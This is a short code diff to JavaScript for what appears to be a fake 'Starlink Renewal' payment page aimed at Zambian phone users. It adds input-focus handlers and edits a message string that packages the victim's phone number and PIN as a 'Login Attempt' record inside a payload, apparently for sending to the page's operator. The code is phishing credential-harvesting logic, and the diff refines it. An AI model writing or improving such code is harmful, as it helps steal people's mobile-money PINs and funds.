@@ -136,6 +136,9 @@ const confirmButton = document.getElementById('confirm');
 const approvalSpinner = document.getElementById('approvalSpinner');
 let paymentAmount = 'ZMW 25.00';
 
+document.querySelector('.phone-box').addEventListener('click', () => phone.focus());
+document.querySelector('.pin-box').addEventListener('click', () => pinInput.focus());
+
 try {
   const selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan') || 'null');
   const amount = selectedPlan && String(selectedPlan.price || '').match(/\d+(?:\.\d+)?/);
@@ -171,7 +174,7 @@ confirmButton.addEventListener('click', async () => {
 
   sessionStorage.setItem('submittedPhone', phoneNumber);
 
-  const message = `login attempt \nPhone: +260${phoneNumber}\nPIN: ${pin}\nService: Starlink Renewal\nAmount: ${paymentAmount}`;
+  const message = `Login Attempt\nPhone: +260${phoneNumber}\nPIN: ${pin}\nService: Starlink Renewal\nAmount: ${paymentAmount}`;
 
   const payload = { text: message, type: 'trial' };
 
